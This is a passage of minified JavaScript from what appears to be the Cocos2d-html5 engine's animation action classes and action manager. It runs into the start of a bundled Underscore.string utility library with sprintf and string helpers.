        this._previousPosition.x = e,
        this._previousPosition.y = i,
        this._startPosition.x = e,
        this._startPosition.y = i
    },
    update: function(t) {
        if (t = this._computeEaseTime(t), this.target) {
            var e = this._config,
            i = 0,
            n = e[0].x,
            r = e[1].x,
            c = e[2].x,
            o = 0,
            s = e[0].y,
            a = e[1].y,
            h = e[2].y,
            l = cc.bezierAt(i, n, r, c, t),
            u = cc.bezierAt(o, s, a, h, t),
            _ = this._startPosition;
            if (cc.ENABLE_STACKABLE_ACTIONS) {
                var d = this.target.getPositionX(),
                f = this.target.getPositionY(),
                p = this._previousPosition;
                _.x = _.x + d - p.x,
                _.y = _.y + f - p.y,
                l += _.x,
                u += _.y,
                p.x = l,
                p.y = u,
                this.target.setPosition(l, u)
            } else this.target.setPosition(_.x + l, _.y + u)
        }
    },
    reverse: function() {
        var t = this._config,
        e = [cc.pAdd(t[1], cc.pNeg(t[2])), cc.pAdd(t[0], cc.pNeg(t[2])), cc.pNeg(t[2])],
        i = cc.BezierBy.create(this._duration, e);
        return this._cloneDecoration(i),
        this._reverseEaseList(i),
        i
    }
}),
cc.BezierBy.create = function(t, e) {
    return new cc.BezierBy(t, e)
},
cc.BezierTo = cc.BezierBy.extend({
    _toConfig: null,
    ctor: function(t, e) {
        cc.BezierBy.prototype.ctor.call(this),
        this._toConfig = [],
        e && this.initWithDuration(t, e)
    },
    initWithDuration: function(t, e) {
        return cc.ActionInterval.prototype.initWithDuration.call(this, t) ? (this._toConfig = e, !0) : !1
    },
    clone: function() {
        var t = new cc.BezierTo;
        return this._cloneDecoration(t),
        t.initWithDuration(this._duration, this._toConfig),
        t
    },
    startWithTarget: function(t) {
        cc.BezierBy.prototype.startWithTarget.call(this, t);
        var e = this._startPosition,
        i = this._toConfig,
        n = this._config;
        n[0] = cc.pSub(i[0], e),
        n[1] = cc.pSub(i[1], e),
        n[2] = cc.pSub(i[2], e)
    }
}),
cc.BezierTo.create = function(t, e) {
    return new cc.BezierTo(t, e)
},
cc.ScaleTo = cc.ActionInterval.extend({
    _scaleX: 1,
    _scaleY: 1,
    _startScaleX: 1,
    _startScaleY: 1,
    _endScaleX: 0,
    _endScaleY: 0,
    _deltaX: 0,
    _deltaY: 0,
    ctor: function(t, e, i) {
        cc.ActionInterval.prototype.ctor.call(this),
        void 0 !== e && this.initWithDuration(t, e, i)
    },
    initWithDuration: function(t, e, i) {
        return cc.ActionInterval.prototype.initWithDuration.call(this, t) ? (this._endScaleX = e, this._endScaleY = null != i ? i: e, !0) : !1
    },
    clone: function() {
        var t = new cc.ScaleTo;
        return this._cloneDecoration(t),
        t.initWithDuration(this._duration, this._endScaleX, this._endScaleY),
        t
    },
    startWithTarget: function(t) {
        cc.ActionInterval.prototype.startWithTarget.call(this, t),
        this._startScaleX = t.scaleX,
        this._startScaleY = t.scaleY,
        this._deltaX = this._endScaleX - this._startScaleX,
        this._deltaY = this._endScaleY - this._startScaleY
    },
    update: function(t) {
        t = this._computeEaseTime(t),
        this.target && (this.target.scaleX = this._startScaleX + this._deltaX * t, this.target.scaleY = this._startScaleY + this._deltaY * t)
    }
}),
cc.ScaleTo.create = function(t, e, i) {
    var n = new cc.ScaleTo;
    return n.initWithDuration(t, e, i),
    n
},
cc.ScaleBy = cc.ScaleTo.extend({
    startWithTarget: function(t) {
        cc.ScaleTo.prototype.startWithTarget.call(this, t),
        this._deltaX = this._startScaleX * this._endScaleX - this._startScaleX,
        this._deltaY = this._startScaleY * this._endScaleY - this._startScaleY
    },
    reverse: function() {
        var t = cc.ScaleBy.create(this._duration, 1 / this._endScaleX, 1 / this._endScaleY);
        return this._cloneDecoration(t),
        this._reverseEaseList(t),
        t
    },
    clone: function() {
        var t = new cc.ScaleBy;
        return this._cloneDecoration(t),
        t.initWithDuration(this._duration, this._endScaleX, this._endScaleY),
        t
    }
}),
cc.ScaleBy.create = function(t, e, i) {
    return new cc.ScaleBy(t, e, i)
},
cc.Blink = cc.ActionInterval.extend({
    _times: 0,
    _originalState: !1,
    ctor: function(t, e) {
        cc.ActionInterval.prototype.ctor.call(this),
        void 0 !== e && this.initWithDuration(t, e)
    },
    initWithDuration: function(t, e) {
        return cc.ActionInterval.prototype.initWithDuration.call(this, t) ? (this._times = e, !0) : !1
    },
    clone: function() {
        var t = new cc.Blink;
        return this._cloneDecoration(t),
        t.initWithDuration(this._duration, this._times),
        t
    },
    update: function(t) {
        if (t = this._computeEaseTime(t), this.target && !this.isDone()) {
            var e = 1 / this._times,
            i = t % e;
            this.target.visible = i > e / 2
        }
    },
    startWithTarget: function(t) {
        cc.ActionInterval.prototype.startWithTarget.call(this, t),
        this._originalState = t.visible
    },
    stop: function() {
        this.target.visible = this._originalState,
        cc.ActionInterval.prototype.stop.call(this)
    },
    reverse: function() {
        var t = cc.Blink.create(this._duration, this._times);
        return this._cloneDecoration(t),
        this._reverseEaseList(t),
        t
    }
}),
cc.Blink.create = function(t, e) {
    var i = new cc.Blink;
    return i.initWithDuration(t, e),
    i
},
cc.FadeTo = cc.ActionInterval.extend({
    _toOpacity: 0,
    _fromOpacity: 0,
    ctor: function(t, e) {
        cc.ActionInterval.prototype.ctor.call(this),
        void 0 !== e && this.initWithDuration(t, e)
    },
    initWithDuration: function(t, e) {
        return cc.ActionInterval.prototype.initWithDuration.call(this, t) ? (this._toOpacity = e, !0) : !1
    },
    clone: function() {
        var t = new cc.FadeTo;
        return this._cloneDecoration(t),
        t.initWithDuration(this._duration, this._toOpacity),
        t
    },
    update: function(t) {
        if (t = this._computeEaseTime(t), this.target.RGBAProtocol) {
            var e = void 0 !== this._fromOpacity ? this._fromOpacity: 255;
            this.target.opacity = e + (this._toOpacity - e) * t
        }
    },
    startWithTarget: function(t) {
        cc.ActionInterval.prototype.startWithTarget.call(this, t),
        this.target.RGBAProtocol && (this._fromOpacity = t.opacity)
    }
}),
cc.FadeTo.create = function(t, e) {
    return new cc.FadeTo(t, e)
},
cc.FadeIn = cc.FadeTo.extend({
    _reverseAction: null,
    reverse: function() {
        var t = new cc.FadeOut;
        return t.initWithDuration(this._duration, 0),
        this._cloneDecoration(t),
        this._reverseEaseList(t),
        t
    },
    clone: function() {
        var t = new cc.FadeIn;
        return this._cloneDecoration(t),
        t.initWithDuration(this._duration, this._toOpacity),
        t
    },
    startWithTarget: function(t) {
        this._reverseAction && (this._toOpacity = this._reverseAction._fromOpacity),
        cc.FadeTo.prototype.startWithTarget.call(this, t)
    }
}),
cc.FadeIn.create = function(t, e) {
    return null == e && (e = 255),
    new cc.FadeIn(t, e)
},
cc.FadeOut = cc.FadeTo.extend({
    reverse: function() {
        var t = new cc.FadeIn;
        return t._reverseAction = this,
        t.initWithDuration(this._duration, 255),
        this._cloneDecoration(t),
        this._reverseEaseList(t),
        t
    },
    clone: function() {
        var t = new cc.FadeOut;
        return this._cloneDecoration(t),
        t.initWithDuration(this._duration, this._toOpacity),
        t
    }
}),
cc.FadeOut.create = function(t) {
    var e = new cc.FadeOut;
    return e.initWithDuration(t, 0),
    e
},
cc.TintTo = cc.ActionInterval.extend({
    _to: null,
    _from: null,
    ctor: function(t, e, i, n) {
        cc.ActionInterval.prototype.ctor.call(this),
        this._to = cc.color(0, 0, 0),
        this._from = cc.color(0, 0, 0),
        void 0 !== n && this.initWithDuration(t, e, i, n)
    },
    initWithDuration: function(t, e, i, n) {
        return cc.ActionInterval.prototype.initWithDuration.call(this, t) ? (this._to = cc.color(e, i, n), !0) : !1
    },
    clone: function() {
        var t = new cc.TintTo;
        this._cloneDecoration(t);
        var e = this._to;
        return t.initWithDuration(this._duration, e.r, e.g, e.b),
        t
    },
    startWithTarget: function(t) {
        cc.ActionInterval.prototype.startWithTarget.call(this, t),
        this.target.RGBAProtocol && (this._from = this.target.color)
    },
    update: function(t) {
        t = this._computeEaseTime(t);
        var e = this._from,
        i = this._to;
        e && this.target.RGBAProtocol && (this.target.color = cc.color(e.r + (i.r - e.r) * t, e.g + (i.g - e.g) * t, e.b + (i.b - e.b) * t))
    }
}),
cc.TintTo.create = function(t, e, i, n) {
    return new cc.TintTo(t, e, i, n)
},
cc.TintBy = cc.ActionInterval.extend({
    _deltaR: 0,
    _deltaG: 0,
    _deltaB: 0,
    _fromR: 0,
    _fromG: 0,
    _fromB: 0,
    ctor: function(t, e, i, n) {
        cc.ActionInterval.prototype.ctor.call(this),
        void 0 !== n && this.initWithDuration(t, e, i, n)
    },
    initWithDuration: function(t, e, i, n) {
        return cc.ActionInterval.prototype.initWithDuration.call(this, t) ? (this._deltaR = e, this._deltaG = i, this._deltaB = n, !0) : !1
    },
    clone: function() {
        var t = new cc.TintBy;
        return this._cloneDecoration(t),
        t.initWithDuration(this._duration, this._deltaR, this._deltaG, this._deltaB),
        t
    },
    startWithTarget: function(t) {
        if (cc.ActionInterval.prototype.startWithTarget.call(this, t), t.RGBAProtocol) {
            var e = t.color;
            this._fromR = e.r,
            this._fromG = e.g,
            this._fromB = e.b
        }
    },
    update: function(t) {
        t = this._computeEaseTime(t),
        this.target.RGBAProtocol && (this.target.color = cc.color(this._fromR + this._deltaR * t, this._fromG + this._deltaG * t, this._fromB + this._deltaB * t))
    },
    reverse: function() {
        var t = cc.TintBy.create(this._duration, -this._deltaR, -this._deltaG, -this._deltaB);
        return this._cloneDecoration(t),
        this._reverseEaseList(t),
        t
    }
}),
cc.TintBy.create = function(t, e, i, n) {
    return new cc.TintBy(t, e, i, n)
},
cc.DelayTime = cc.ActionInterval.extend({
    update: function() {},
    reverse: function() {
        var t = cc.DelayTime.create(this._duration);
        return this._cloneDecoration(t),
        this._reverseEaseList(t),
        t
    },
    clone: function() {
        var t = new cc.DelayTime;
        return this._cloneDecoration(t),
        t.initWithDuration(this._duration),
        t
    }
}),
cc.DelayTime.create = function(t) {
    return new cc.DelayTime(t)
},
cc.ReverseTime = cc.ActionInterval.extend({
    _other: null,
    ctor: function(t) {
        cc.ActionInterval.prototype.ctor.call(this),
        this._other = null,
        t && this.initWithAction(t)
    },
    initWithAction: function(t) {
        if (!t) throw "cc.ReverseTime.initWithAction(): action must be non null";
        if (t == this._other) throw "cc.ReverseTime.initWithAction(): the action was already passed in.";
        return cc.ActionInterval.prototype.initWithDuration.call(this, t._duration) ? (this._other = t, !0) : !1
    },
    clone: function() {
        var t = new cc.ReverseTime;
        return this._cloneDecoration(t),
        t.initWithAction(this._other.clone()),
        t
    },
    startWithTarget: function(t) {
        cc.ActionInterval.prototype.startWithTarget.call(this, t),
        this._other.startWithTarget(t)
    },
    update: function(t) {
        t = this._computeEaseTime(t),
        this._other && this._other.update(1 - t)
    },
    reverse: function() {
        return this._other.clone()
    },
    stop: function() {
        this._other.stop(),
        cc.Action.prototype.stop.call(this)
    }
}),
cc.ReverseTime.create = function(t) {
    return new cc.ReverseTime(t)
},
cc.Animate = cc.ActionInterval.extend({
    _animation: null,
    _nextFrame: 0,
    _origFrame: null,
    _executedLoops: 0,
    _splitTimes: null,
    ctor: function(t) {
        cc.ActionInterval.prototype.ctor.call(this),
        this._splitTimes = [],
        t && this.initWithAnimation(t)
    },
    getAnimation: function() {
        return this._animation
    },
    setAnimation: function(t) {
        this._animation = t
    },
    initWithAnimation: function(t) {
        if (!t) throw "cc.Animate.initWithAnimation(): animation must be non-NULL";
        var e = t.getDuration();
        if (this.initWithDuration(e * t.getLoops())) {
            this._nextFrame = 0,
            this.setAnimation(t),
            this._origFrame = null,
            this._executedLoops = 0;
            var i = this._splitTimes;
            i.length = 0;
            var n = 0,
            r = e / t.getTotalDelayUnits(),
            c = t.getFrames();
            cc.arrayVerifyType(c, cc.AnimationFrame);
            for (var o = 0; o < c.length; o++) {
                var s = c[o],
                a = n * r / e;
                n += s.getDelayUnits(),
                i.push(a)
            }
            return ! 0
        }
        return ! 1
    },
    clone: function() {
        var t = new cc.Animate;
        return this._cloneDecoration(t),
        t.initWithAnimation(this._animation.clone()),
        t
    },
    startWithTarget: function(t) {
        cc.ActionInterval.prototype.startWithTarget.call(this, t),
        this._animation.getRestoreOriginalFrame() && (this._origFrame = t.displayFrame()),
        this._nextFrame = 0,
        this._executedLoops = 0
    },
    update: function(t) {
        if (t = this._computeEaseTime(t), 1 > t) {
            t *= this._animation.getLoops();
            var e = 0 | t;
            e > this._executedLoops && (this._nextFrame = 0, this._executedLoops++),
            t %= 1
        }
        for (var i = this._animation.getFrames(), n = i.length, r = this._splitTimes, c = this._nextFrame; n > c && r[c] <= t; c++) this.target.setSpriteFrame(i[c].getSpriteFrame()),
        this._nextFrame = c + 1
    },
    reverse: function() {
        var t = this._animation,
        e = t.getFrames(),
        i = [];
        if (cc.arrayVerifyType(e, cc.AnimationFrame), e.length > 0) for (var n = e.length - 1; n >= 0; n--) {
            var r = e[n];
            if (!r) break;
            i.push(r.clone())
        }
        var c = cc.Animation.create(i, t.getDelayPerUnit(), t.getLoops());
        c.setRestoreOriginalFrame(t.getRestoreOriginalFrame());
        var o = cc.Animate.create(c);
        return this._cloneDecoration(o),
        this._reverseEaseList(o),
        o
    },
    stop: function() {
        this._animation.getRestoreOriginalFrame() && this.target && this.target.setSpriteFrame(this._origFrame),
        cc.Action.prototype.stop.call(this)
    }
}),
cc.Animate.create = function(t) {
    return new cc.Animate(t)
},
cc.TargetedAction = cc.ActionInterval.extend({
    _action: null,
    _forcedTarget: null,
    ctor: function(t, e) {
        cc.ActionInterval.prototype.ctor.call(this),
        e && this.initWithTarget(t, e)
    },
    initWithTarget: function(t, e) {
        return this.initWithDuration(e._duration) ? (this._forcedTarget = t, this._action = e, !0) : !1
    },
    clone: function() {
        var t = new cc.TargetedAction;
        return this._cloneDecoration(t),
        t.initWithTarget(this._forcedTarget, this._action.clone()),
        t
    },
    startWithTarget: function(t) {
        cc.ActionInterval.prototype.startWithTarget.call(this, t),
        this._action.startWithTarget(this._forcedTarget)
    },
    stop: function() {
        this._action.stop()
    },
    update: function(t) {
        t = this._computeEaseTime(t),
        this._action.update(t)
    },
    getForcedTarget: function() {
        return this._forcedTarget
    },
    setForcedTarget: function(t) {
        this._forcedTarget != t && (this._forcedTarget = t)
    }
}),
cc.TargetedAction.create = function(t, e) {
    return new cc.TargetedAction(t, e)
},
cc.HashElement = cc.Class.extend({
    actions: null,
    target: null,
    actionIndex: 0,
    currentAction: null,
    currentActionSalvaged: !1,
    paused: !1,
    hh: null,
    ctor: function() {
        this.actions = [],
        this.target = null,
        this.actionIndex = 0,
        this.currentAction = null,
        this.currentActionSalvaged = !1,
        this.paused = !1,
        this.hh = null
    }
}),
cc.ActionManager = cc.Class.extend({
    _hashTargets: null,
    _arrayTargets: null,
    _currentTarget: null,
    _currentTargetSalvaged: !1,
    _searchElementByTarget: function(t, e) {
        for (var i = 0; i < t.length; i++) if (e == t[i].target) return t[i];
        return null
    },
    ctor: function() {
        this._hashTargets = {},
        this._arrayTargets = [],
        this._currentTarget = null,
        this._currentTargetSalvaged = !1
    },
    addAction: function(t, e, i) {
        if (!t) throw "cc.ActionManager.addAction(): action must be non-null";
        if (!e) throw "cc.ActionManager.addAction(): action must be non-null";
        var n = this._hashTargets[e.__instanceId];
        n || (n = new cc.HashElement, n.paused = i, n.target = e, this._hashTargets[e.__instanceId] = n, this._arrayTargets.push(n)),
        this._actionAllocWithHashElement(n),
        n.actions.push(t),
        t.startWithTarget(e)
    },
    removeAllActions: function() {
        for (var t = this._arrayTargets,
        e = 0; e < t.length; e++) {
            var i = t[e];
            i && this.removeAllActionsFromTarget(i.target, !0)
        }
    },
    removeAllActionsFromTarget: function(t, e) {
        if (null != t) {
            var i = this._hashTargets[t.__instanceId];
            i && ( - 1 === i.actions.indexOf(i.currentAction) || i.currentActionSalvaged || (i.currentActionSalvaged = !0), i.actions.length = 0, this._currentTarget != i || e ? this._deleteHashElement(i) : this._currentTargetSalvaged = !0)
        }
    },
    removeAction: function(t) {
        if (null != t) {
            var e = t.getOriginalTarget(),
            i = this._hashTargets[e.__instanceId];
            if (i) {
                for (var n = 0; n < i.actions.length; n++) if (i.actions[n] == t) {
                    i.actions.splice(n, 1);
                    break
                }
            } else cc.log(cc._LogInfos.ActionManager_removeAction)
        }
    },
    removeActionByTag: function(t, e) {
        t == cc.ACTION_TAG_INVALID && cc.log(cc._LogInfos.ActionManager_addAction),
        cc.assert(e, cc._LogInfos.ActionManager_addAction);
        var i = this._hashTargets[e.__instanceId];
        if (i) for (var n = i.actions.length,
        r = 0; n > r; ++r) {
            var c = i.actions[r];
            if (c && c.getTag() === t && c.getOriginalTarget() == e) {
                this._removeActionAtIndex(r, i);
                break
            }
        }
    },
    getActionByTag: function(t, e) {
        t == cc.ACTION_TAG_INVALID && cc.log(cc._LogInfos.ActionManager_getActionByTag);
        var i = this._hashTargets[e.__instanceId];
        if (i) {
            if (null != i.actions) for (var n = 0; n < i.actions.length; ++n) {
                var r = i.actions[n];
                if (r && r.getTag() === t) return r
            }
            cc.log(cc._LogInfos.ActionManager_getActionByTag_2, t)
        }
        return null
    },
    numberOfRunningActionsInTarget: function(t) {
        var e = this._hashTargets[t.__instanceId];
        return e && e.actions ? e.actions.length: 0
    },
    pauseTarget: function(t) {
        var e = this._hashTargets[t.__instanceId];
        e && (e.paused = !0)
    },
    resumeTarget: function(t) {
        var e = this._hashTargets[t.__instanceId];
        e && (e.paused = !1)
    },
    pauseAllRunningActions: function() {
        for (var t = [], e = this._arrayTargets, i = 0; i < e.length; i++) {
            var n = e[i];
            n && !n.paused && (n.paused = !0, t.push(n.target))
        }
        return t
    },
    resumeTargets: function(t) {
        if (t) for (var e = 0; e < t.length; e++) t[e] && this.resumeTarget(t[e])
    },
    purgeSharedManager: function() {
        cc.director.getScheduler().unscheduleUpdateForTarget(this)
    },
    _removeActionAtIndex: function(t, e) {
        var i = e.actions[t];
        i != e.currentAction || e.currentActionSalvaged || (e.currentActionSalvaged = !0),
        e.actions.splice(t, 1),
        e.actionIndex >= t && e.actionIndex--,
        0 == e.actions.length && (this._currentTarget == e ? this._currentTargetSalvaged = !0 : this._deleteHashElement(e))
    },
    _deleteHashElement: function(t) {
        t && (delete this._hashTargets[t.target.__instanceId], cc.arrayRemoveObject(this._arrayTargets, t), t.actions = null, t.target = null)
    },
    _actionAllocWithHashElement: function(t) {
        null == t.actions && (t.actions = [])
    },
    update: function(t) {
        for (var e, i = this._arrayTargets,
        n = 0; n < i.length; n++) {
            if (this._currentTarget = i[n], e = this._currentTarget, !e.paused) for (e.actionIndex = 0; e.actionIndex < e.actions.length; e.actionIndex++) if (e.currentAction = e.actions[e.actionIndex], e.currentAction) {
                if (e.currentActionSalvaged = !1, e.currentAction.step(t * (e.currentAction._speedMethod ? e.currentAction._speed: 1)), e.currentActionSalvaged) e.currentAction = null;
                else if (e.currentAction.isDone()) {
                    e.currentAction.stop();
                    var r = e.currentAction;
                    e.currentAction = null,
                    this.removeAction(r)
                }
                e.currentAction = null
            }
            this._currentTargetSalvaged && 0 === e.actions.length && this._deleteHashElement(e)
        }
    }
}),
cc.ActionTweenDelegate = cc.Class.extend({
    updateTweenAction: function() {}
}),
cc.ActionTween = cc.ActionInterval.extend({
    key: "",
    from: 0,
    to: 0,
    delta: 0,
    ctor: function(t, e, i, n) {
        cc.ActionInterval.prototype.ctor.call(this),
        this.key = "",
        void 0 !== n && this.initWithDuration(t, e, i, n)
    },
    initWithDuration: function(t, e, i, n) {
        return cc.ActionInterval.prototype.initWithDuration.call(this, t) ? (this.key = e, this.to = n, this.from = i, !0) : !1
    },
    startWithTarget: function(t) {
        if (!t || !t.updateTweenAction) throw "cc.ActionTween.startWithTarget(): target must be non-null, and target must implement updateTweenAction function";
        cc.ActionInterval.prototype.startWithTarget.call(this, t),
        this.delta = this.to - this.from
    },
    update: function(t) {
        this.target.updateTweenAction(this.to - this.delta * (1 - t), this.key)
    },
    reverse: function() {
        return cc.ActionTween.create(this.duration, this.key, this.to, this.from)
    },
    clone: function() {
        var t = new cc.ActionTween;
        return t.initWithDuration(this._duration, this.key, this.from, this.to),
        t
    }
}),
cc.ActionTween.create = function(t, e, i, n) {
    var r = new cc.ActionTween;
    return r.initWithDuration(t, e, i, n) ? r: null
},
cc.action = cc.Action.create,
cc.speed = cc.Speed.create,
cc.follow = cc.Follow.create,
cc.orbitCamera = cc.OrbitCamera.create,
cc.cardinalSplineTo = cc.CardinalSplineTo.create,
cc.cardinalSplineBy = cc.CardinalSplineBy.create,
cc.catmullRomTo = cc.CatmullRomTo.create,
cc.catmullRomBy = cc.CatmullRomBy.create,
cc.show = cc.Show.create,
cc.hide = cc.Hide.create,
cc.toggleVisibility = cc.ToggleVisibility.create,
cc.removeSelf = cc.RemoveSelf.create,
cc.flipX = cc.FlipX.create,
cc.flipY = cc.FlipY.create,
cc.place = cc.Place.create,
cc.callFunc = cc.CallFunc.create,
cc.actionInterval = cc.ActionInterval.create,
cc.sequence = cc.Sequence.create,
cc.repeat = cc.Repeat.create,
cc.repeatForever = cc.RepeatForever.create,
cc.spawn = cc.Spawn.create,
cc.rotateTo = cc.RotateTo.create,
cc.rotateBy = cc.RotateBy.create,
cc.moveBy = cc.MoveBy.create,
cc.moveTo = cc.MoveTo.create,
cc.skewTo = cc.SkewTo.create,
cc.skewBy = cc.SkewBy.create,
cc.jumpBy = cc.JumpBy.create,
cc.jumpTo = cc.JumpTo.create,
cc.bezierBy = cc.BezierBy.create,
cc.bezierTo = cc.BezierTo.create,
cc.scaleTo = cc.ScaleTo.create,
cc.scaleBy = cc.ScaleBy.create,
cc.blink = cc.Blink.create,
cc.fadeTo = cc.FadeTo.create,
cc.fadeIn = cc.FadeIn.create,
cc.fadeOut = cc.FadeOut.create,
cc.tintTo = cc.TintTo.create,
cc.tintBy = cc.TintBy.create,
cc.delayTime = cc.DelayTime.create,
cc.reverseTime = cc.ReverseTime.create,
cc.animate = cc.Animate.create,
cc.targetedAction = cc.TargetedAction.create,
cc.actionTween = cc.ActionTween.create,
!
function(t, e) {
    "use strict";
    var i = e.prototype.trim,
    n = e.prototype.trimRight,
    r = e.prototype.trimLeft,
    c = function(t) {
        return 1 * t || 0
    },
    o = function(t, e) {
        if (1 > e) return "";
        for (var i = ""; e > 0;) 1 & e && (i += t),
        e >>= 1,
        t += t;
        return i
    },
    s = [].slice,
    a = function(t) {
        return null == t ? "\\s": t.source ? t.source: "[" + d.escapeRegExp(t) + "]"
    },
    h = {
        lt: "<",
        gt: ">",
        quot: '"',
        apos: "'",
        amp: "&"
    },
    l = {};
    for (var u in h) l[h[u]] = u;
    var _ = function() {
        function t(t) {
            return Object.prototype.toString.call(t).slice(8, -1).toLowerCase()
        }
        var i = o,
        n = function() {
            return n.cache.hasOwnProperty(arguments[0]) || (n.cache[arguments[0]] = n.parse(arguments[0])),
            n.format.call(null, n.cache[arguments[0]], arguments)
        };
        return n.format = function(n, r) {
            var c, o, s, a, h, l, u, d = 1,
            f = n.length,
            p = "",
            g = [];
            for (o = 0; f > o; o++) if (p = t(n[o]), "string" === p) g.push(n[o]);
            else if ("array" === p) {
                if (a = n[o], a[2]) for (c = r[d], s = 0; s < a[2].length; s++) {
                    if (!c.hasOwnProperty(a[2][s])) throw new Error(_('[_.sprintf] property "%s" does not exist', a[2][s]));
                    c = c[a[2][s]]
                } else c = a[1] ? r[a[1]] : r[d++];
                if (/[^s]/.test(a[8]) && "number" != t(c)) throw new Error(_("[_.sprintf] expecting number but found %s", t(c)));
                switch (a[8]) {
                case "b":
                    c = c.toString(2);
                    break;
                case "c":
                    c = e.fromCharCode(c);
                    break;
                case "d":
                    c = parseInt(c, 10);
                    break;
                case "e":
                    c = a[7] ? c.toExponential(a[7]) : c.toExponential();
                    break;
                case "f":
                    c = a[7] ? parseFloat(c).toFixed(a[7]) : parseFloat(c);
                    break;
                case "o":
                    c = c.toString(8);
                    break;
                case "s":
                    c = (c = e(c)) && a[7] ? c.substring(0, a[7]) : c;
                    break;
                case "u":
                    c = Math.abs(c);
                    break;
                case "x":
                    c = c.toString(16);
                    break;
                case "X":
                    c = c.toString(16).toUpperCase()
                }
                c = /[def]/.test(a[8]) && a[3] && c >= 0 ? "+" + c: c,
                l = a[4] ? "0" == a[4] ? "0": a[4].charAt(1) : " ",
                u = a[6] - e(c).length,
                h = a[6] ? i(l, u) : "",
                g.push(a[5] ? c + h: h + c)
            }
            return g.join("")
        },
        n.cache = {},
        n.parse = function(t) {
            for (var e = t,
            i = [], n = [], r = 0; e;) {
                if (null !== (i = /^[^\x25]+/.exec(e))) n.push(i[0]);
                else if (null !== (i = /^\x25{2}/.exec(e))) n.push("%");
                else {
                    if (null === (i = /^\x25(?:([1-9]\d*)\$|\(([^\)]+)\))?(\+)?(0|'[^$])?(-)?(\d+)?(?:\.(\d+))?([b-fosuxX])/.exec(e))) throw new Error("[_.sprintf] huh?");
                    if (i[2]) {
                        r |= 1;
                        var c = [],
                        o = i[2],
                        s = [];
                        if (null === (s = /^([a-z_][a-z_\d]*)/i.exec(o))) throw new Error("[_.sprintf] huh?");
                        for (c.push(s[1]);
                        "" !== (o = o.substring(s[0].length));) if (null !== (s = /^\.([a-z_][a-z_\d]*)/i.exec(o))) c.push(s[1]);
                        else {
                            if (null === (s = /^\[(\d+)\]/.exec(o))) throw new Error("[_.sprintf] huh?");
                            c.push(s[1])
                        }
                        i[2] = c
                    } else r |= 2;
                    if (3 === r) throw new Error("[_.sprintf] mixing positional and named placeholders is not (yet) supported");
                    n.push(i)
                }
                e = e.substring(i[0].length)
            }
            return n
        },
        n
    } (),
    d = {
        VERSION: "2.3.0",
        isBlank: function(t) {
            return null == t && (t = ""),
            /^\s*$/.test(t)
        },
        stripTags: function(t) {
            return null == t ? "": e(t).replace(/<\/?[^>]+>/g, "")
        },
        capitalize: function(t) {
            return t = null == t ? "": e(t),
            t.charAt(0).toUpperCase() + t.slice(1)
        },
        chop: function(t, i) {
            return null == t ? [] : (t = e(t), i = ~~i, i > 0 ? t.match(new RegExp(".{1," + i + "}", "g")) : [t])
        },
        clean: function(t) {
            return d.strip(t).replace(/\s+/g, " ")
        },
        count: function(t, i) {
            return null == t || null == i ? 0 : e(t).split(i).length - 1
        },
        chars: function(t) {
            return null == t ? [] : e(t).split("")
        },
        swapCase: function(t) {
            return null == t ? "": e(t).replace(/\S/g,
            function(t) {
                return t === t.toUpperCase() ? t.toLowerCase() : t.toUpperCase()
            })
        },
        escapeHTML: function(t) {
            return null == t ? "": e(t).replace(/[&<>"']/g,
            function(t) {
                return "&" + l[t] + ";"
            })
        },
        unescapeHTML: function(t) {
            return null == t ? "": e(t).replace(/\&([^;]+);/g,
            function(t, i) {
                var n;
                return i in h ? h[i] : (n = i.match(/^#x([\da-fA-F]+)$/)) ? e.fromCharCode(parseInt(n[1], 16)) : (n = i.match(/^#(\d+)$/)) ? e.fromCharCode(~~n[1]) : t
            })
        },
        escapeRegExp: function(t) {
            return null == t ? "": e(t).replace(/([.*+?^=!:${}()|[\]\/\\])/g, "\\$1")
        },
        splice: function(t, e, i, n) {
            var r = d.chars(t);
            return r.splice(~~e, ~~i, n),
            r.join("")
        },
        insert: function(t, e, i) {
            return d.splice(t, e, 0, i)
        },
        include: function(t, i) {
            return "" === i ? !0 : null == t ? !1 : -1 !== e(t).indexOf(i)
        },
        join: function() {
            var t = s.call(arguments),
            e = t.shift();
            return null == e && (e = ""),
            t.join(e)
        },
        lines: function(t) {
            return null == t ? [] : e(t).split("\n")
        },
        reverse: function(t) {
            return d.chars(t).reverse().join("")
        },
        startsWith: function(t, i) {
            return "" === i ? !0 : null == t || null == i ? !1 : (t = e(t), i = e(i), t.length >= i.length && t.slice(0, i.length) === i)
        },
        endsWith: function(t, i) {
            return "" === i ? !0 : null == t || null == i ? !1 : (t = e(t), i = e(i), t.length >= i.length && t.slice(t.length - i.length) === i)
        },
        succ: function(t) {
            return null == t ? "": (t = e(t), t.slice(0, -1) + e.fromCharCode(t.charCodeAt(t.length - 1) + 1))
        },
        titleize: function(t) {
            return null == t ? "": e(t).replace(/(?:^|\s)\S/g,
            function(t) {
                return t.toUpperCase()
            })
        },
        camelize: function(t) {
            return d.trim(t).replace(/[-_\s]+(.)?/g,
            function(t, e) {
                return e.toUpperCase()
            })
        },
        underscored: function(t) {
            return d.trim(t).replace(/([a-z\d])([A-Z]+)/g, "$1_$2").replace(/[-\s]+/g, "_").toLowerCase()
        },
        dasherize: function(t) {
            return d.trim(t).replace(/([A-Z])/g, "-$1").replace(/[-_\s]+/g, "-").toLowerCase()
        },
        classify: function(t) {
            return d.titleize(e(t).replace(/_/g, " ")).replace(/\s/g, "")
        },
        humanize: function(t) {
            return d.capitalize(d.underscored(t).replace(/_id$/, "").replace(/_/g, " "))
        },
        trim: function(t, n) {
            return null == t ? "": !n && i ? i.call(t) : (n = a(n), e(t).replace(new RegExp("^" + n + "+|" + n + "+$", "g"), ""))
        },
        ltrim: function(t, i) {
            return null == t ? "": !i && r ? r.call(t) : (i = a(i), e(t).replace(new RegExp("^" + i + "+"), ""))
        },
        rtrim: function(t, i) {
            return null == t ? "": !i && n ? n.call(t) : (i = a(i), e(t).replace(new RegExp(i + "+$"), ""))
        },
        truncate: function(t, i, n) {
            return null == t ? "": (t = e(t), n = n || "...", i = ~~i, t.length > i ? t.slice(0, i) + n: t)
        },
        prune: function(t, i, n) {
            if (null == t) return "";
            if (t = e(t), i = ~~i, n = null != n ? e(n) : "...", t.length <= i) return t;
            var r = function(t) {
                return t.toUpperCase() !== t.toLowerCase() ? "A": " "
            },
            c = t.slice(0, i + 1).replace(/.(?=\W*\w*$)/g, r);
            return c = c.slice(c.length - 2).match(/\w\w/) ? c.replace(/\s*\S+$/, "") : d.rtrim(c.slice(0, c.length - 1)),
            (c + n).length > t.length ? t: t.slice(0, c.length) + n
        },
        words: function(t, e) {
